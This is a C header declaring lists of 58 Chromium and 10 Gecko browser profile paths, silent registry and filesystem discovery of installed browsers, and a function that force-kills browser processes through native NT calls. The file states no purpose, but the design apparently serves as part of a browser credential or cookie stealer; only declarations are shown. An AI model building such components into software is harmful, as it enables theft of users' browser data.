#ifndef BROWSER_PATHS_H
#define BROWSER_PATHS_H

#include <stddef.h>

typedef struct {
    const char *name;
    const char *path_suffix;
    int use_roaming; // 0 = LOCALAPPDATA, 1 = APPDATA
    const char *process_name; // exe stem (e.g. "chrome", "msedge"), NULL if unknown
} BrowserPath;

// Get all Chromium browser paths (58 browsers)
const BrowserPath *get_chromium_browsers(size_t *count);

// Get all Gecko browser paths (10 browsers)
const BrowserPath *get_gecko_browsers(size_t *count);

// Registry-based Chromium browser discovery
// Scans HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\
// for .exe entries pointing to Chromium-based browsers.
// Returns 0 on success, silently skips errors.
int discover_chromium_browsers_registry(BrowserPath *out, size_t max_out, size_t *count);

// Filesystem-based Gecko browser discovery.
// Scans %APPDATA% at depth ≤2 for directories containing profiles.ini.
// Derives browser name from directory name. use_roaming = 1 for all entries.
// Returns 0 on success, silently returns 0 count if APPDATA unavailable.
int discover_gecko_browsers_fs(BrowserPath *out, size_t max_out, size_t *count);

// Kill all processes matching name (e.g. "chrome", "msedge").
// Uses NtGetNextProcess + NtTerminateProcess. Guarded by ENABLE_KILL_BROWSERS.
// Returns count of processes terminated. NULL name → no-op. Access denied → skip.
int kill_browser_processes(const char *process_name);

#endif
